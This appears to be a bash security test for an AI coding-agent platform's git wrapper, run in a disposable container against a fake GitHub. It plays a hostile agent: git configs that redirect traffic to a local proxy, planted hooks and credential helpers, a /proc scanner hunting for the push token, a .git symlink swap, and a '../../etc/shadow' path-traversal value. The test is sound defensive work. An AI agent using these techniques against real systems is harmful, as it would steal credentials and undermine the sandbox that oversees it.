#!/usr/bin/env bash
# Runs inside a throwaway ubuntu:24.04 container as root (see test/vm/gitDocker.test.ts).
# Exercises backend/vm/git.sh the way Freestyle exec runs it (script on stdin, values in env) against a
# fake https://github.com, with a hostile repo-local config and an agent-uid process scanning /proc for
# the token while root pushes. Prints `RESULT <name> pass|fail <detail>` lines, then `DONE`.
set -Euo pipefail

VM=/vm
FX=/fixtures
TOKEN="gho_TESTSECRETtoken0123456789abcdefABCD"
U=u0123456789ab
REPO=acme/web
MIRROR=/var/lib/morrow/mirrors/$U/acme__web.git
MAIN=/home/$U/work/acme__web
BRANCH=morrow/t1/api
WT=/home/$U/work/.worktrees/acme__web/morrow-t1-api-0011aabb
SAFE_PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

result() { printf 'RESULT %s %s %s\n' "$1" "$2" "${3:-}"; }
check() { local name="$1"; shift; if "$@" >/dev/null 2>&1; then result "$name" pass; else result "$name" fail; fi; }
json_field() { python3 -c 'import json,sys; v=json.loads(sys.stdin.read().strip().splitlines()[-1]).get(sys.argv[1]); print("" if v is None else str(v).lower() if isinstance(v,bool) else v)' "$1"; }

# Freestyle exec: `morrow_script="$(cat)" && exec /bin/bash -c "$morrow_script" morrow-vm`, env from the API.
as_root() { env -i PATH="$SAFE_PATH" HOME=/root "$@" bash -c 'morrow_script="$(cat)" && exec /bin/bash -c "$morrow_script" morrow-vm' <"$VM/git.sh"; }
as_agent_exec() { runuser -u "$U" -- env -i PATH="$SAFE_PATH" HOME="/home/$U" "$@" bash -c 'morrow_script="$(cat)" && exec /bin/bash -c "$morrow_script" morrow-vm' <"$VM/git.sh"; }
agent() { runuser -u "$U" -- env -i PATH="$SAFE_PATH" HOME="/home/$U" "$@" </dev/null; }
export VM SAFE_PATH U
export -f as_root as_agent_exec
new_cred() {
  local name
  name="cred.$(openssl rand -hex 16)"
  (umask 077 && printf '%s' "$1" >"/var/lib/morrow/cred/$name")
  printf '%s' "$name"
}

# ---------- fake GitHub on 127.0.0.1:443 with a CA the system trusts ----------
echo "127.0.0.1 github.com" >>/etc/hosts
mkdir -p /srv/tls && cd /srv/tls
openssl req -x509 -newkey rsa:2048 -nodes -days 2 -subj "/CN=Fake CA" -keyout ca.key -out ca.pem 2>/dev/null
openssl req -newkey rsa:2048 -nodes -subj "/CN=github.com" -keyout gh.key -out gh.csr 2>/dev/null
printf 'subjectAltName=DNS:github.com\n' >san.ext
openssl x509 -req -in gh.csr -CA ca.pem -CAkey ca.key -CAcreateserial -days 2 -extfile san.ext -out gh.pem 2>/dev/null
cp ca.pem /usr/local/share/ca-certificates/fake-ca.crt && update-ca-certificates >/dev/null 2>&1

mkdir -p /srv/git/acme && git init -q --bare -b main /srv/git/acme/web.git
git -C /srv/git/acme/web.git config http.receivepack true
seed=$(mktemp -d) && git -C "$seed" init -q -b main && printf 'hello\n' >"$seed/README.md" \
  && git -C "$seed" -c user.name=s -c user.email=s@x add -A && git -C "$seed" -c user.name=s -c user.email=s@x commit -qm seed \
  && git -C "$seed" push -q /srv/git/acme/web.git main
chown -R root:root /srv/git && chmod -R go-rwx /srv/git /srv/tls
EXPECTED_TOKEN="$TOKEN" python3 "$FX/fake-github.py" /srv/tls/gh.pem /srv/tls/gh.key &
# Anything that tries the hostile proxy lands here.
python3 -c '
import socket
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("127.0.0.1", 9999)); s.listen(8)
while True:
    c, _ = s.accept(); open("/var/log/proxy-hits", "a").write("hit\n"); c.close()
' &
for _ in $(seq 1 50); do (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null && break; sleep 0.1; done

# ---------- bootstrap + clone ----------
env -i PATH="$SAFE_PATH" MORROW_USER=$U bash "$VM/bootstrap-user.sh" >/dev/null
out=$(as_root OP=clone MORROW_USER=$U REPO_FULL_NAME=$REPO CRED_NAME="$(new_cred "$TOKEN")" 2>&1)
[ "$(json_field cloned <<<"$out")" = true ] && result clone pass || result clone fail "$out"
check clone_owned_by_engineer test "$(stat -c %U "$MAIN/.git/config")" = "$U"
check clone_origin_is_mirror test "$(agent git -C "$MAIN" remote get-url origin)" = "$MIRROR"
check mirror_dir_mode test "$(stat -c '%a %U %G' "$MIRROR")" = "2750 root $U"
check mirror_config_root_only_writable test "$(stat -c '%a %U' "$MIRROR/config")" = "640 root"
check no_cred_files_after_clone test -z "$(ls -A /var/lib/morrow/cred)"

# ---------- worktree (engineer, no token anywhere) ----------
out=$(as_agent_exec OP=worktree REPO_FULL_NAME=$REPO BRANCH=$BRANCH BASE_BRANCH=main WT_PATH=$WT 2>&1)
[ "$(json_field created <<<"$out")" = true ] && result worktree pass || result worktree fail "$out"

# ---------- hostile repo-local and global config, written by the agent ----------
cat >/usr/local/bin/morrow-mark <<'EOF'
#!/bin/sh
echo "$(id -u) $1" >>/tmp/markers
EOF
chmod 0755 /usr/local/bin/morrow-mark
touch /tmp/markers && chmod 0666 /tmp/markers
agent bash -c '
set -e
cd "$1"
c() { git config "$@"; }
c http.proxy http://127.0.0.1:9999
c http.https://github.com/.proxy http://127.0.0.1:9999
c https.proxy http://127.0.0.1:9999
c http.sslCAInfo "$HOME/evil-ca.pem"
c http.sslVerify false
c core.hooksPath "$HOME/evilhooks"
c core.fsmonitor "morrow-mark fsmonitor"
c core.sshCommand "morrow-mark sshCommand"
c core.gitProxy "morrow-mark gitProxy"
c core.askPass "morrow-mark askPass"
c credential.helper "!morrow-mark credential-helper"
c uploadpack.packObjectsHook "morrow-mark packObjectsHook"
c url.http://127.0.0.1:9999/.insteadOf https://github.com/
c remote.origin.pushurl http://127.0.0.1:9999/x
c include.path "$HOME/evil.inc"
printf "[uploadpack]\n\tpackObjectsHook = morrow-mark packObjectsHook-include\n[http]\n\tproxy = http://127.0.0.1:9999\n[core]\n\tfsmonitor = morrow-mark fsmonitor-include\n" >"$HOME/evil.inc"
printf "not a ca\n" >"$HOME/evil-ca.pem"
mkdir -p "$HOME/evilhooks"
for h in pre-push post-update pre-receive update reference-transaction post-checkout pre-commit post-commit push-to-checkout pre-auto-gc post-rewrite; do
  printf "#!/bin/sh\nmorrow-mark hook-%s\n" "$h" >"$HOME/evilhooks/$h"; cp "$HOME/evilhooks/$h" .git/hooks/$h; chmod +x "$HOME/evilhooks/$h" .git/hooks/$h
done
git config --global http.proxy http://127.0.0.1:9999
git config --global url.http://127.0.0.1:9999/.insteadOf https://github.com/
git config --global credential.helper "!morrow-mark global-credential-helper"
git config --global core.fsmonitor "morrow-mark global-fsmonitor"
' _ "$MAIN"

# ---------- the agent commits; root publishes while the agent scans /proc ----------
agent bash -c 'printf "work\n" >"$1/api.txt"' _ "$WT"
out=$(as_agent_exec OP=commit BRANCH=$BRANCH WT_PATH=$WT MESSAGE="morrow: checkpoint ws e1" AUTHOR_NAME=Morrow AUTHOR_EMAIL=agent@morrow.invalid 2>&1)
committed_sha=$(json_field sha <<<"$out")
[ "$(json_field committed <<<"$out")" = true ] && result commit pass || result commit fail "$out"

cat >/tmp/scan.sh <<'EOF'
#!/bin/bash
# Agent-uid scanner: every readable environ and cmdline, the credential dir, over and over.
# The token arrives on stdin, so it is in neither this scanner's argv nor its environment.
read -r token; hits=0; seen=""; root_git=0; remote_https=0; environ_readable=0; cred_readable=0
while [ ! -e /tmp/scan-stop ]; do
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
    cmd=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline") || continue
    if [ "$(stat -c %u "$p" 2>/dev/null)" = 0 ] && [[ "$cmd" == *git* ]]; then
      root_git=$((root_git + 1))
      [[ "$cmd" == *remote-https* ]] && remote_https=$((remote_https + 1))
      if env_dump=$(tr '\0' '\n' 2>/dev/null <"$p/environ"); then environ_readable=$((environ_readable + 1)); fi
    else
      env_dump=$(tr '\0' '\n' 2>/dev/null <"$p/environ") || env_dump=""
    fi
    case "$cmd$env_dump" in *"$token"*) hits=$((hits + 1)); seen="${cmd:0:80}" ;; esac
  done
  if cat /var/lib/morrow/cred/* >/dev/null 2>&1 || ls /var/lib/morrow/cred >/dev/null 2>&1; then cred_readable=$((cred_readable + 1)); fi
done
printf '%s %s %s %s %s %s\n' "$hits" "$root_git" "$remote_https" "$environ_readable" "$cred_readable" "${seen//$token/<token>}" >/tmp/scan-result
EOF
chmod 0755 /tmp/scan.sh
start_scan() {
  rm -f /tmp/scan-stop /tmp/scan-result
  printf '%s\n' "$TOKEN" | runuser -u "$U" -- env -i PATH="$SAFE_PATH" /tmp/scan.sh &
  scanner=$!
  sleep 0.3
}
stop_scan() { touch /tmp/scan-stop && wait "$scanner"; }

# Control: the scanner does catch a token in another process's env or argv (the old design's exposure).
start_scan
runuser -u "$U" -- env MORROW_GIT_TOKEN="$TOKEN" sleep 1.5
stop_scan
read -r control_hits _ </tmp/scan-result
check scan_control_detects_env_leak test "$control_hits" -gt 0

start_scan
out=$(as_root OP=publish MORROW_USER=$U REPO_FULL_NAME=$REPO BRANCH=$BRANCH CRED_NAME="$(new_cred "$TOKEN")" 2>&1)
stop_scan
pushed_sha=$(json_field sha <<<"$out")
[ "$(json_field pushed <<<"$out")" = true ] && result publish pass || result publish fail "$out"
check publish_pushed_the_commit test "$pushed_sha" = "$committed_sha"
check github_has_the_branch test "$(git -C /srv/git/acme/web.git rev-parse "refs/heads/$BRANCH")" = "$committed_sha"
check mirror_tracks_the_branch test "$(git -C "$MIRROR" rev-parse "refs/heads/$BRANCH")" = "$committed_sha"
read -r hits root_git remote_https environ_readable cred_readable seen </tmp/scan-result
check scan_no_token_seen test "$hits" = 0
check scan_saw_root_git_processes test "$root_git" -gt 0
check scan_saw_root_https_transport test "$remote_https" -gt 0
check scan_root_environ_unreadable test "$environ_readable" = 0
check scan_cred_dir_unreadable test "$cred_readable" = 0
result scan_counts info "hits=$hits root_git_reads=$root_git remote_https_reads=$remote_https environ_readable=$environ_readable cred_readable=$cred_readable seen=${seen:-none}"
check github_push_was_authenticated grep -q '"path": "/acme/web.git/git-receive-pack", "query": "", "auth": "ok"' /var/log/fake-github.jsonl
check hostile_proxy_never_used test ! -s /var/log/proxy-hits
check no_root_marker bash -c '! grep -q "^0 " /tmp/markers'
result markers info "$(tr '\n' ';' </tmp/markers)"
check no_cred_files_after_publish test -z "$(ls -A /var/lib/morrow/cred)"
check token_not_in_mirror_or_home bash -c "! grep -rqF '$TOKEN' '$MIRROR' /home/$U /var/lib/morrow/locks /var/lib/morrow/git-home"

# ---------- the agent cannot touch the mirror ----------
check agent_cannot_write_mirror bash -c "! runuser -u $U -- touch '$MIRROR/objects/x' 2>/dev/null"
check agent_cannot_push_to_mirror bash -c "! runuser -u $U -- env -i PATH=$SAFE_PATH HOME=/home/$U git -C '$MAIN' push -q '$MIRROR' HEAD:refs/heads/evil 2>/dev/null"
check agent_can_fetch_mirror agent git -C "$MAIN" fetch -q origin

# ---------- sync after root writes: the engineer can still read new objects ----------
seed2=$(mktemp -d) && git clone -q /srv/git/acme/web.git "$seed2" && printf 'upstream\n' >"$seed2/up.txt" \
  && git -C "$seed2" -c user.name=s -c user.email=s@x add -A && git -C "$seed2" -c user.name=s -c user.email=s@x commit -qm up \
  && git -C "$seed2" push -q origin main
out=$(as_root OP=sync MORROW_USER=$U REPO_FULL_NAME=$REPO CRED_NAME="$(new_cred "$TOKEN")" 2>&1)
[ "$(json_field synced <<<"$out")" = true ] && result sync pass || result sync fail "$out"
out=$(as_agent_exec OP=worktree REPO_FULL_NAME=$REPO BRANCH=morrow/t1/web BASE_BRANCH=main WT_PATH=/home/$U/work/.worktrees/acme__web/morrow-t1-web-22 2>&1)
[ "$(json_field head <<<"$out")" = "$(git -C /srv/git/acme/web.git rev-parse main)" ] && result worktree_after_sync pass || result worktree_after_sync fail "$out"
check no_cred_files_after_sync test -z "$(ls -A /var/lib/morrow/cred)"

# ---------- access failures are reported as auth, not as a crash ----------
out=$(as_root OP=sync MORROW_USER=$U REPO_FULL_NAME=$REPO 2>/dev/null)
check sync_without_token_is_auth test "$(json_field reason <<<"$out")" = auth
out=$(as_root OP=sync MORROW_USER=$U REPO_FULL_NAME=$REPO CRED_NAME="$(new_cred gho_WRONGtoken0123456789abcdefABCDEF)" 2>/dev/null)
check sync_wrong_token_is_auth test "$(json_field reason <<<"$out")" = auth
check no_cred_files_after_failure test -z "$(ls -A /var/lib/morrow/cred)"

# ---------- someone moved the branch on GitHub: rejected, never forced ----------
seed3=$(mktemp -d) && git clone -q -b "$BRANCH" /srv/git/acme/web.git "$seed3" && printf 'other\n' >"$seed3/other.txt" \
  && git -C "$seed3" -c user.name=s -c user.email=s@x add -A && git -C "$seed3" -c user.name=s -c user.email=s@x commit -qm other \
  && git -C "$seed3" push -q origin "$BRANCH"
remote_tip=$(git -C /srv/git/acme/web.git rev-parse "refs/heads/$BRANCH")
agent bash -c 'printf "more\n" >>"$1/api.txt"' _ "$WT"
as_agent_exec OP=commit BRANCH=$BRANCH WT_PATH=$WT MESSAGE="morrow: checkpoint ws e2" >/dev/null 2>&1
out=$(as_root OP=publish MORROW_USER=$U REPO_FULL_NAME=$REPO BRANCH=$BRANCH CRED_NAME="$(new_cred "$TOKEN")" 2>/dev/null)
check publish_rejected_when_branch_moved test "$(json_field reason <<<"$out")" = rejected
check rejected_push_left_github_alone test "$(git -C /srv/git/acme/web.git rev-parse "refs/heads/$BRANCH")" = "$remote_tip"

# ---------- the agent swaps its .git for a link to a root-only repo ----------
secret=$(mktemp -d /root/secret.XXXX) && git -C "$secret" init -q -b "$BRANCH" && printf 'root secret\n' >"$secret/s.txt" \
  && git -C "$secret" -c user.name=r -c user.email=r@x add -A && git -C "$secret" -c user.name=r -c user.email=r@x commit -qm secret
secret_sha=$(git -C "$secret" rev-parse HEAD)
chmod 0700 /root
agent bash -c 'mv "$1/.git" "$1/.git.real" && ln -s "$2/.git" "$1/.git"' _ "$MAIN" "$secret"
out=$(as_root OP=publish MORROW_USER=$U REPO_FULL_NAME=$REPO BRANCH=$BRANCH CRED_NAME="$(new_cred "$TOKEN")" 2>&1)
check symlinked_repo_refused bash -c "! git -C '$MIRROR' cat-file -e '$secret_sha' 2>/dev/null"
check symlinked_repo_not_pushed bash -c "! git -C /srv/git/acme/web.git cat-file -e '$secret_sha' 2>/dev/null"
result symlinked_publish_output info "$(tr '\n' ' ' <<<"$out" | cut -c1-200)"
check no_cred_files_at_end test -z "$(ls -A /var/lib/morrow/cred)"

# ---------- input validation ----------
check bad_user_refused bash -c "! as_root OP=sync MORROW_USER=root REPO_FULL_NAME=$REPO"
check bad_repo_refused bash -c "! as_root OP=sync MORROW_USER=$U REPO_FULL_NAME='acme/../x'"
check bad_cred_name_refused bash -c "! as_root OP=sync MORROW_USER=$U REPO_FULL_NAME=$REPO CRED_NAME=../../etc/shadow"
check root_ops_refuse_engineer bash -c "! as_agent_exec OP=publish MORROW_USER=$U REPO_FULL_NAME=$REPO BRANCH=$BRANCH"
check engineer_ops_refuse_root bash -c "! as_root OP=commit BRANCH=$BRANCH WT_PATH=$WT MESSAGE=x"
echo DONE
